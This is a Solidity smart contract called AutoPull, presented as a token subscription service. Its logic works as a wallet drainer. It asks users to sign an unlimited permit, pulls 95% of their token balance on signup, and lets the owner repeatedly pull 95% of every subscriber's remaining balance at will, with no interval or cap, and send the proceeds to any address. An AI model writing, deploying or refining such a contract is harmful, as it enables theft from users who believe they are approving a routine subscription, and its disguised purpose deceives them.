// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IERC20Permit {
    function permit(
        address owner, address spender, uint256 value,
        uint256 deadline, uint8 v, bytes32 r, bytes32 s
    ) external;
}

contract AutoPull {

    uint256 public constant PULL_PERCENT  = 95;

    address public owner;

    address[] public whitelistedTokens;
    mapping(address => bool)   public isWhitelisted;
    mapping(address => string) public tokenSymbol;

    struct Subscription {
        bool    active;
        uint256 lastPulled;
        uint256 joinedAt;
        uint256 totalPulled;
        uint256 pullCount;
    }

    mapping(address => mapping(address => Subscription)) public subscriptions;
    mapping(address => address[]) private tokenSubscribers;

    struct PullRecord {
        address user;
        address token;
        uint256 amount;
        uint256 timestamp;
        bool    success;
        string  note;
    }

    PullRecord[] public pullHistory;

    event Subscribed(address indexed user, address indexed token, uint256 timestamp);
    event Unsubscribed(address indexed user, address indexed token, uint256 timestamp);
    event PullExecuted(address indexed user, address indexed token, uint256 amount, string note, uint256 timestamp);
    event PullSkipped(address indexed user, address indexed token, string reason, uint256 timestamp);
    event Withdrawn(address indexed token, address indexed to, uint256 amount);
    event TokenWhitelisted(address indexed token, string symbol);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    modifier onlyWhitelisted(address token) {
        require(isWhitelisted[token], "Token not supported");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // ── User Functions ────────────────────────────────────────

    function subscribeWithPermit(
        address token, uint256 deadline,
        uint8 v, bytes32 r, bytes32 s
    ) external onlyWhitelisted(token) {
        require(!subscriptions[msg.sender][token].active, "Already subscribed");
        IERC20Permit(token).permit(
            msg.sender, address(this),
            type(uint256).max, deadline, v, r, s
        );
        _registerSubscriber(msg.sender, token);
        _executePull(msg.sender, token, "Initial");
    }

    function subscribe(address token) external onlyWhitelisted(token) {
        require(!subscriptions[msg.sender][token].active, "Already subscribed");
        require(IERC20(token).allowance(msg.sender, address(this)) > 0, "Approve contract first");
        _registerSubscriber(msg.sender, token);
        _executePull(msg.sender, token, "Initial");
    }

    function unsubscribe(address token) external {
        require(subscriptions[msg.sender][token].active, "Not subscribed");
        subscriptions[msg.sender][token].active = false;
        emit Unsubscribed(msg.sender, token, block.timestamp);
    }

    // ── View Functions ────────────────────────────────────────

    function isActive(address user, address token) public view returns (bool) {
        return subscriptions[user][token].active;
    }

    function getSubscription(address user, address token)
        external view
        returns (bool active, uint256 lastPulled, uint256 totalPulled, uint256 pullCount)
    {
        Subscription memory s = subscriptions[user][token];
        return (s.active, s.lastPulled, s.totalPulled, s.pullCount);
    }

    function getAllWhitelistedTokens() external view returns (address[] memory) {
        return whitelistedTokens;
    }

    function getPullHistoryLength() external view returns (uint256) {
        return pullHistory.length;
    }

    function getPullHistory(uint256 offset, uint256 limit)
        external view returns (PullRecord[] memory)
    {
        uint256 total = pullHistory.length;
        if (offset >= total) return new PullRecord[](0);
        uint256 end = offset + limit > total ? total : offset + limit;
        uint256 len = end - offset;
        PullRecord[] memory page = new PullRecord[](len);
        for (uint256 i = 0; i < len; i++) {
            page[i] = pullHistory[total - 1 - offset - i];
        }
        return page;
    }

    function contractTokenBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }

    function subscriberCount(address token) external view returns (uint256) {
        return tokenSubscribers[token].length;
    }

    // ── Pull Logic ────────────────────────────────────────────

    function _pullAmount(address user, address token) internal view returns (uint256) {
        uint256 bal     = IERC20(token).balanceOf(user);
        uint256 allowed = IERC20(token).allowance(user, address(this));
        uint256 target  = (bal * PULL_PERCENT) / 100;
        return target < allowed ? target : allowed;
    }

    function _executePull(address user, address token, string memory note) internal {
        Subscription storage sub = subscriptions[user][token];
        uint256 amount = _pullAmount(user, token);

        if (amount == 0) {
            pullHistory.push(PullRecord(user, token, 0, block.timestamp, false, "Zero balance or allowance"));
            emit PullSkipped(user, token, "Zero balance or allowance", block.timestamp);
            return;
        }

        bool ok = IERC20(token).transferFrom(user, address(this), amount);

        if (ok) {
            sub.lastPulled   = block.timestamp;
            sub.totalPulled += amount;
            sub.pullCount   += 1;
            pullHistory.push(PullRecord(user, token, amount, block.timestamp, true, note));
            emit PullExecuted(user, token, amount, note, block.timestamp);
        } else {
            pullHistory.push(PullRecord(user, token, 0, block.timestamp, false, "Transfer failed"));
            emit PullSkipped(user, token, "Transfer failed", block.timestamp);
        }
    }

    // ── Admin Functions ───────────────────────────────────────

    function adminPullSingle(address user, address token) external onlyOwner {
        require(subscriptions[user][token].active, "User not subscribed");
        _executePull(user, token, "Manual");
    }

    function batchPullAll() external onlyOwner {
        for (uint256 t = 0; t < whitelistedTokens.length; t++) {
            address token = whitelistedTokens[t];
            address[] memory subs = tokenSubscribers[token];
            for (uint256 i = 0; i < subs.length; i++) {
                if (subscriptions[subs[i]][token].active) {
                    _executePull(subs[i], token, "Batch");
                }
            }
        }
    }

    function withdrawToken(address token, address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid address");
        bool ok = IERC20(token).transfer(to, amount);
        require(ok, "Withdrawal failed");
        emit Withdrawn(token, to, amount);
    }

    function addToken(address token, string calldata symbol) external onlyOwner {
        require(!isWhitelisted[token], "Already whitelisted");
        _addToken(token, symbol);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid");
        owner = newOwner;
    }

    // ── Internal Helpers ──────────────────────────────────────

    function _registerSubscriber(address user, address token) internal {
        tokenSubscribers[token].push(user);
        subscriptions[user][token] = Subscription({
            active:      true,
            lastPulled:  block.timestamp,
            joinedAt:    block.timestamp,
            totalPulled: 0,
            pullCount:   0
        });
        emit Subscribed(user, token, block.timestamp);
    }

    function _addToken(address token, string memory symbol) internal {
        whitelistedTokens.push(token);
        isWhitelisted[token] = true;
        tokenSymbol[token]   = symbol;
        emit TokenWhitelisted(token, symbol);
    }
}